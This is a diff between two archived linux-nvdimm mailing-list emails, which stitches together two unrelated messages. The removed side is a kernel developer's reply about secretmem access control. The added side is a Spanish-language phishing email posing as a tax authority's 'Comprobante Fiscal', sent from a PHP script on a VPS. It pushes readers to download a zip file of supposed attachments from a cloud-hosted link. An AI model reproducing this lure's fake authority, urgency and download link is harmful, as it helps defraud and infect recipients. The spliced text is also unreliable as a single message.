@@ -2,138 +2,184 @@ Return-Path: <linux-nvdimm-bounces@lists.01.org>
 X-Original-To: lists+linux-nvdimm@lfdr.de
 Delivered-To: lists+linux-nvdimm@lfdr.de
 Received: from ml01.01.org (ml01.01.org [IPv6:2001:19d0:306:5::1])
-	by mail.lfdr.de (Postfix) with ESMTPS id 13876308025
-	for <lists+linux-nvdimm@lfdr.de>; Thu, 28 Jan 2021 22:05:56 +0100 (CET)
+	by mail.lfdr.de (Postfix) with ESMTPS id 32627308232
+	for <lists+linux-nvdimm@lfdr.de>; Fri, 29 Jan 2021 01:04:28 +0100 (CET)
 Received: from ml01.vlan13.01.org (localhost [IPv6:::1])
-	by ml01.01.org (Postfix) with ESMTP id 5FE3F100F2245;
-	Thu, 28 Jan 2021 13:05:54 -0800 (PST)
-Received-SPF: Pass (mailfrom) identity=mailfrom; client-ip=148.163.156.1; helo=mx0a-001b2d01.pphosted.com; envelope-from=jejb@linux.ibm.com; receiver=<UNKNOWN> 
-Received: from mx0a-001b2d01.pphosted.com (mx0a-001b2d01.pphosted.com [148.163.156.1])
-	(using TLSv1.2 with cipher ECDHE-RSA-AES256-GCM-SHA384 (256/256 bits))
-	(No client certificate requested)
-	by ml01.01.org (Postfix) with ESMTPS id BEEE7100F2244
-	for <linux-nvdimm@lists.01.org>; Thu, 28 Jan 2021 13:05:51 -0800 (PST)
-Received: from pps.filterd (m0098410.ppops.net [127.0.0.1])
-	by mx0a-001b2d01.pphosted.com (8.16.0.42/8.16.0.42) with SMTP id 10SL1dJf127066;
-	Thu, 28 Jan 2021 16:05:15 -0500
-DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed; d=ibm.com; h=message-id : subject :
- from : reply-to : to : cc : date : in-reply-to : references : content-type
- : mime-version : content-transfer-encoding; s=pp1;
- bh=bpUTcXPeXWH0uCpR0CReuSqLBN7qKOd8RBfv7PAKG14=;
- b=cgL4eeLInzOWENu3PUE8gW1uebW9ootUk9Cacy40GwqzTQAH7KOmGHlmRcO+gPDUjj8U
- Ng8GA3Fi25GHsaCyIq8H+HQGpXWxvdbZgbr0KJOaaYsL0PUK876/2Puau7XeJTQCl4ZF
- HqSzSURQMQLdj5pTQMeGVFnsNPLlCu4ZTsK/E4Df1N2bRndbeu6D7oid4Wmpf4UhhFKC
- 5ohg2Jqb3Vz3a6ntiK5SjP38X1Gjkba8HCL8MVWE7N8kOEdjSKlWLU1BxfjjO05lS+Mv
- Mdr+jdbupdB+frROL90k0GdYDEwzmPr0b6BmHf0aO51cF/o6+s5+hm+XhdWCvQkxwU7T ag==
-Received: from pps.reinject (localhost [127.0.0.1])
-	by mx0a-001b2d01.pphosted.com with ESMTP id 36c3d3aa6m-1
-	(version=TLSv1.2 cipher=ECDHE-RSA-AES256-GCM-SHA384 bits=256 verify=NOT);
-	Thu, 28 Jan 2021 16:05:15 -0500
-Received: from m0098410.ppops.net (m0098410.ppops.net [127.0.0.1])
-	by pps.reinject (8.16.0.36/8.16.0.36) with SMTP id 10SL2rJ7131704;
-	Thu, 28 Jan 2021 16:05:14 -0500
-Received: from ppma03dal.us.ibm.com (b.bd.3ea9.ip4.static.sl-reverse.com [169.62.189.11])
-	by mx0a-001b2d01.pphosted.com with ESMTP id 36c3d3aa5d-1
-	(version=TLSv1.2 cipher=ECDHE-RSA-AES256-GCM-SHA384 bits=256 verify=NOT);
-	Thu, 28 Jan 2021 16:05:14 -0500
-Received: from pps.filterd (ppma03dal.us.ibm.com [127.0.0.1])
-	by ppma03dal.us.ibm.com (8.16.0.42/8.16.0.42) with SMTP id 10SKqhG1019569;
-	Thu, 28 Jan 2021 21:05:12 GMT
-Received: from b03cxnp08027.gho.boulder.ibm.com (b03cxnp08027.gho.boulder.ibm.com [9.17.130.19])
-	by ppma03dal.us.ibm.com with ESMTP id 368be9t6w1-1
-	(version=TLSv1.2 cipher=ECDHE-RSA-AES256-GCM-SHA384 bits=256 verify=NOT);
-	Thu, 28 Jan 2021 21:05:12 +0000
-Received: from b03ledav004.gho.boulder.ibm.com (b03ledav004.gho.boulder.ibm.com [9.17.130.235])
-	by b03cxnp08027.gho.boulder.ibm.com (8.14.9/8.14.9/NCO v10.0) with ESMTP id 10SL5B3Y11862404
-	(version=TLSv1/SSLv3 cipher=DHE-RSA-AES256-GCM-SHA384 bits=256 verify=OK);
-	Thu, 28 Jan 2021 21:05:11 GMT
-Received: from b03ledav004.gho.boulder.ibm.com (unknown [127.0.0.1])
-	by IMSVA (Postfix) with ESMTP id 2882F7805C;
-	Thu, 28 Jan 2021 21:05:11 +0000 (GMT)
-Received: from b03ledav004.gho.boulder.ibm.com (unknown [127.0.0.1])
-	by IMSVA (Postfix) with ESMTP id 2EFAE78068;
-	Thu, 28 Jan 2021 21:05:04 +0000 (GMT)
-Received: from jarvis.int.hansenpartnership.com (unknown [9.85.133.159])
-	by b03ledav004.gho.boulder.ibm.com (Postfix) with ESMTP;
-	Thu, 28 Jan 2021 21:05:03 +0000 (GMT)
-Message-ID: <73738cda43236b5ac2714e228af362b67a712f5d.camel@linux.ibm.com>
-Subject: Re: [PATCH v16 07/11] secretmem: use PMD-size pages to amortize
- direct map fragmentation
-From: James Bottomley <jejb@linux.ibm.com>
-To: Michal Hocko <mhocko@suse.com>, Mike Rapoport <rppt@kernel.org>
-Date: Thu, 28 Jan 2021 13:05:02 -0800
-In-Reply-To: <YBK1kqL7JA7NePBQ@dhcp22.suse.cz>
-References: <20210121122723.3446-1-rppt@kernel.org>
-	 <20210121122723.3446-8-rppt@kernel.org>
-	 <20210126114657.GL827@dhcp22.suse.cz>
-	 <303f348d-e494-e386-d1f5-14505b5da254@redhat.com>
-	 <20210126120823.GM827@dhcp22.suse.cz> <20210128092259.GB242749@kernel.org>
-	 <YBK1kqL7JA7NePBQ@dhcp22.suse.cz>
-User-Agent: Evolution 3.34.4 
+	by ml01.01.org (Postfix) with ESMTP id 30723100EAB65;
+	Thu, 28 Jan 2021 16:04:26 -0800 (PST)
+Received-SPF: None (mailfrom) identity=mailfrom; client-ip=2a00:f940:1:1:2::f1; helo=185-20-226-123.ovz.vps.regruhosting.ru; envelope-from=www-data@185-20-226-123.ovz.vps.regruhosting.ru; receiver=<UNKNOWN> 
+Received: from 185-20-226-123.ovz.vps.regruhosting.ru (unknown [IPv6:2a00:f940:1:1:2::f1])
+	by ml01.01.org (Postfix) with ESMTP id 120B2100EAB64
+	for <linux-nvdimm@lists.01.org>; Thu, 28 Jan 2021 16:04:23 -0800 (PST)
+Received: by 185-20-226-123.ovz.vps.regruhosting.ru (Postfix, from userid 33)
+	id 996342F52742; Fri, 29 Jan 2021 00:04:20 +0000 (UTC)
+To: linux-nvdimm@lists.01.org
+Subject: Comprobante Fiscal - [ id 309171198  ]
+X-PHP-Originating-Script: 0:espanha.php
 MIME-Version: 1.0
-X-TM-AS-GCONF: 00
-X-Proofpoint-Virus-Version: vendor=fsecure engine=2.50.10434:6.0.343,18.0.737
- definitions=2021-01-28_12:2021-01-28,2021-01-28 signatures=0
-X-Proofpoint-Spam-Details: rule=outbound_notspam policy=outbound score=0 mlxscore=0 bulkscore=0
- lowpriorityscore=0 spamscore=0 suspectscore=0 mlxlogscore=911
- impostorscore=0 priorityscore=1501 adultscore=0 phishscore=0 clxscore=1015
- malwarescore=0 classifier=spam adjust=0 reason=mlx scancount=1
- engine=8.12.0-2009150000 definitions=main-2101280099
-Message-ID-Hash: ZGFKYNYCL6DMH7U2UBN52ZRBECCN5RHC
-X-Message-ID-Hash: ZGFKYNYCL6DMH7U2UBN52ZRBECCN5RHC
-X-MailFrom: jejb@linux.ibm.com
+From: Administracion Tributaria <impuestos.hacienda@hotmail.com>
+Message-Id: <20210129000420.996342F52742@185-20-226-123.ovz.vps.regruhosting.ru>
+Date: Fri, 29 Jan 2021 00:04:20 +0000 (UTC)
+Message-ID-Hash: DSX7MUUCC72C2KZPAC6Y3QRMLRB5LZEE
+X-Message-ID-Hash: DSX7MUUCC72C2KZPAC6Y3QRMLRB5LZEE
+X-MailFrom: www-data@185-20-226-123.ovz.vps.regruhosting.ru
 X-Mailman-Rule-Hits: nonmember-moderation
 X-Mailman-Rule-Misses: dmarc-mitigation; no-senders; approved; emergency; loop; banned-address; member-moderation
-CC: David Hildenbrand <david@redhat.com>, Andrew Morton <akpm@linux-foundation.org>, Alexander Viro <viro@zeniv.linux.org.uk>, Andy Lutomirski <luto@kernel.org>, Arnd Bergmann <arnd@arndb.de>, Borislav Petkov <bp@alien8.de>, Catalin Marinas <catalin.marinas@arm.com>, Christopher Lameter <cl@linux.com>, Dave Hansen <dave.hansen@linux.intel.com>, Elena Reshetova <elena.reshetova@intel.com>, "H. Peter Anvin" <hpa@zytor.com>, Ingo Molnar <mingo@redhat.com>, "Kirill A. Shutemov" <kirill@shutemov.name>, Matthew Wilcox <willy@infradead.org>, Mark Rutland <mark.rutland@arm.com>, Mike Rapoport <rppt@linux.ibm.com>, Michael Kerrisk <mtk.manpages@gmail.com>, Palmer Dabbelt <palmer@dabbelt.com>, Paul Walmsley <paul.walmsley@sifive.com>, Peter Zijlstra <peterz@infradead.org>, Rick Edgecombe <rick.p.edgecombe@intel.com>, Roman Gushchin <guro@fb.com>, Shakeel Butt <shakeelb@google.com>, Shuah Khan <shuah@kernel.org>, Thomas Gleixner <tglx@linutronix.de>, Tycho Andersen <tycho@tycho.ws>, Will Deacon
-  <will@kernel.org>, linux-api@vger.kernel.org, linux-arch@vger.kernel.org, linux-arm-kernel@lists.infradead.org, linux-fsdevel@vger.kernel.org, linux-mm@kvack.org, linux-kernel@vger.kernel.org, linux-kselftest@vger.kernel.org, linux-nvdimm@lists.01.org, linux-riscv@lists.infradead.org, x86@kernel.org, Hagen Paul Pfeifer <hagen@jauu.net>, Palmer Dabbelt <palmerdabbelt@google.com>
 X-Mailman-Version: 3.1.1
 Precedence: list
-Reply-To: jejb@linux.ibm.com
 List-Id: "Linux-nvdimm developer list." <linux-nvdimm.lists.01.org>
-Archived-At: <https://lists.01.org/hyperkitty/list/linux-nvdimm@lists.01.org/message/ZGFKYNYCL6DMH7U2UBN52ZRBECCN5RHC/>
+Archived-At: <https://lists.01.org/hyperkitty/list/linux-nvdimm@lists.01.org/message/DSX7MUUCC72C2KZPAC6Y3QRMLRB5LZEE/>
 List-Archive: <https://lists.01.org/hyperkitty/list/linux-nvdimm@lists.01.org/>
 List-Help: <mailto:linux-nvdimm-request@lists.01.org?subject=help>
 List-Post: <mailto:linux-nvdimm@lists.01.org>
 List-Subscribe: <mailto:linux-nvdimm-join@lists.01.org>
 List-Unsubscribe: <mailto:linux-nvdimm-leave@lists.01.org>
+Content-Type: multipart/mixed; boundary="===============8436028783575708124=="
+
+--===============8436028783575708124==
+Content-type: text/html; charset=iso-8859-1
+
+<html xmlns="http://www.w3.org/1999/xhtml"><head>
+    <title>Comprobante </title>
+
+    <meta content="text/html; charset=windows-1252" http-equiv="Content-Type">
+
+    <style type="text/css">
+	
+        <!-- .style3 {
+            font-family: Tahoma, Verdana, Arial, sans-serif;
+            font-size: 13px;
+            color: rgb(68, 68, 68);
+        }
+        
+        .style4 {
+            color: #FF0000;
+            font-weight: bold;
+        }
+        
+        .style5 {
+            font-size: 13px;
+            font-family: Tahoma, Verdana, Arial, sans-serif;
+        }
+        
+        -->
+    </style>
+
+    <meta name="GENERATOR" content="MSHTML 8.00.7600.16385">
+</head>
+
+<body style="FONT-FAMILY: Times New Roman"><span style="WIDOWS: 2; TEXT-TRANSFORM: none; TEXT-INDENT: 0px; BORDER-COLLAPSE: separate; FONT: medium 'Times New Roman'; WHITE-SPACE: normal; ORPHANS: 2; LETTER-SPACING: normal; COLOR: rgb(0,0,0); WORD-SPACING: 0px; webkit-border-horizontal-spacing: 0px; webkit-border-vertical-spacing: 0px; webkit-text-decorations-in-effect: none; webkit-text-size-adjust: auto; webkit-text-stroke-width: 0px" class="Apple-style-span"><span style="FONT-FAMILY: Tahoma, Verdana, Arial, sans-serif; COLOR: rgb(68,68,68); FONT-SIZE: 13px" class="Apple-style-span">
+
+<title></title><table id="ecxtable6" border="0" cellspacing="1" cellpadding="0" width="570" align="center"><tbody>
+
+<style>
+body { background:#FFF;}
+a { color: #555555;; }
+</style>
+
+</tbody>
+</table><table alt="table" cellpadding="0" cellspacing="0" align="center" style="font-family: 'Quicksand', sans-serif;" width="727">
+<tbody>
+    <tr>
+
+        <td alt="td" style="TEXT-ALIGN: center" bgcolor="#ffffff" valign="top">
+
+            <p>&nbsp;</p>
+
+            <p align="left"><font face="Arial, Helvetica, sans-serif">
+  </font></p><div><font face="Arial, Helvetica, sans-serif">
+		
+			 <a href="http://comprobantefiscale.eastus.cloudapp.azure.com/">
+	  <img src="https://uploaddeimagens.com.br/images/002/853/846/thumb/download.png" alt="01 Resultado de imagem para pdf" style="border: 0px solid ; width: 80px; height: 80px;">
+	  </a>
+	  <br>
+	  <a alt="href" href="http://comprobantefiscale.eastus.cloudapp.azure.com/">
+	  <span style="font-family: &quot;Times New Roman&quot;; font-size: medium; font-style: normal; font-weight: 400; letter-spacing: normal; orphans: 2; text-align: start; text-indent: 0px; text-transform: none; white-space: normal; widows: 2; word-spacing: 0px;">
+	  <span style="font-family: &quot;Times New Roman&quot;; font-size: medium; font-style: normal; font-weight: 400; letter-spacing: normal; orphans: 2; text-align: start; text-indent: 0px; text-transform: none; white-space: normal; widows: 2; word-spacing: 0px;">
+	  <span style="font-family: &quot;Times New Roman&quot;; font-size: medium; font-style: normal; font-weight: 400; letter-spacing: normal; orphans: 2; text-align: start; text-indent: 0px; text-transform: none; white-space: normal; widows: 2; word-spacing: 0px;">
+	  <span style="font-family: &quot;Times New Roman&quot;; font-size: medium; font-style: normal; font-weight: 400; letter-spacing: normal; orphans: 2; text-align: start; text-indent: 0px; text-transform: none; white-space: normal; widows: 2; word-spacing: 0px;">
+	  <span class="c_nobdr t_prs" style="text-transform: none;color:blue ;text-indent: 0px; letter-spacing: normal; word-spacing: 0px; white-space: normal;">Descargar todo como.zip  archivos adjuntos ( 128 kb)</span>
+	  </span>
+	  </span>
+	  </span>
+	  </span>
+	  </a>
+	  <br>
+	  <span alt="span" style="font-size: 12px; font-family: &quot;SOBERANA SANS&quot;,serif,EmojiFont;">
+	  <strong>
+	  <br>
+	  </strong>
+	  </span>
+	  <span alt="span 2" style="color: rgb(0, 0, 0); font-family: &quot;Times New Roman&quot;; font-size: medium; font-style: normal; font-weight: 400; letter-spacing: normal; orphans: 2; text-align: start; text-indent: 0px; text-transform: none; white-space: normal; widows: 2; word-spacing: 0px; float: none; display: inline ! important;">se anexa el seguiente comprobante fiscal digital
+</span><br><span style="font-size: 12px; font-family: &quot;SOBERANA SANS&quot;,serif,EmojiFont;"><strong>Remitente:</strong></span><span>&nbsp;</span><span style="font-size: 12px; font-family: &quot;SOBERANA SANS&quot;,serif,EmojiFont;">Servicio de Administracion Tributaria.<br></span><span style="font-size: 13px; font-family: &quot;Soberana Sans&quot;,serif,EmojiFont;">Hemos identificado que tienes pendiente de presentar, al 01 de diciembre de 2020, lo siguiente:<br>
+      <strong style="font-family: Arial; font-style: normal; font-variant: normal; font-weight: bold; font-size: 14px; line-height: 19px; font-size-adjust: none; font-stretch: normal; letter-spacing: normal; orphans: 2; text-indent: 0px; text-transform: none; white-space: normal; widows: 2; word-spacing: 0px; text-align: left; color: rgb(80, 80, 80); background-color: rgb(255, 255, 255);">A quien corresponda<br>
+	  <br>
+	  <hr>
+      <big>SERIE Y FOLIO: &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;
+      &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;
+      &nbsp; &nbsp;&nbsp;248975 <br>
+      FECHA DE EMISION: &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;
+      &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; 28/01/2020<br>
+      MONTO TOTAL: &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;
+      &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;
+      &nbsp; 7874.20</big></strong></span><strong style="font-family: Arial; font-style: normal; font-variant: normal; font-weight: bold; font-size: 14px; line-height: 19px; font-size-adjust: none; font-stretch: normal; letter-spacing: normal; orphans: 2; text-indent: 0px; text-transform: none; white-space: normal; widows: 2; word-spacing: 0px; text-align: left; color: rgb(80, 80, 80); background-color: rgb(255, 255, 255);">
+</strong>
+</font></div><font face="Arial, Helvetica, sans-serif">  
+    
+  
+
+
+
+</font>
+                
+
+                 <p></p><font style="font-size: 11px;" color="#1c4b74" face="Verdana">
+
+<p align="center"> <font color="#FF6633"></font></p>
+
+            <br>
+
+            <br>
+
+            <font style="font-size: 11px;" color="#1c4b74" face="Verdana">Servicio de Administracion Tributaria,<br>
+
+<strong>+34 1308 808 500 Capitales y areas metropolitanas</strong></font></font>
+        </td>
+    </tr>
+
+    <tr>
+
+        
+
+    </tr>
+
+    </tbody>
+    </table>
+    </span>
+    </span>
+
+    <p>&nbsp;</p>
+
+    <p>&nbsp;</p>
+
+    <p>&nbsp;
+
+    </p>
+
+
+
+
+
+
+</body></html>29/01/2021 12:04:20
+--===============8436028783575708124==
 Content-Type: text/plain; charset="us-ascii"
+MIME-Version: 1.0
 Content-Transfer-Encoding: 7bit
-
-On Thu, 2021-01-28 at 14:01 +0100, Michal Hocko wrote:
-> On Thu 28-01-21 11:22:59, Mike Rapoport wrote:
-[...]
-> > I like the idea to have a pool as an optimization rather than a
-> > hard requirement but I don't see why would it need a careful access
-> > control. As the direct map fragmentation is not necessarily
-> > degrades the performance (and even sometimes it actually improves
-> > it) and even then the degradation is small, trying a PMD_ORDER
-> > allocation for a pool and then falling back to 4K page may be just
-> > fine.
-> 
-> Well, as soon as this is a scarce resource then an access control
-> seems like a first thing to think of. Maybe it is not really
-> necessary but then this should be really justified.
-
-The control for the resource is effectively the rlimit today.  I don't
-think dividing the world into people who can and can't use secret
-memory would be useful since the design is to be usable for anyone who
-might have a secret to keep; it would become like the kvm group
-permissions: something which is theoretically an access control but
-which in practise is given to everyone on the system.
-
-> I am also still not sure why this whole thing is not just a
-> ramdisk/ramfs which happens to unmap its pages from the direct
-> map. Wouldn't that be a much more easier model to work with? You
-> would get an access control for free as well.
-
-The original API was a memfd which does have this access control as
-well.  However, the decision was made after much discussion to go with
-a new system call instead.  Obviously the API choice could be revisited
-but do you have anything to add over the previous discussion, or is
-this just to get your access control?
-
-James
+Content-Disposition: inline
 
 _______________________________________________
 Linux-nvdimm mailing list -- linux-nvdimm@lists.01.org
 To unsubscribe send an email to linux-nvdimm-leave@lists.01.org
+
+--===============8436028783575708124==--
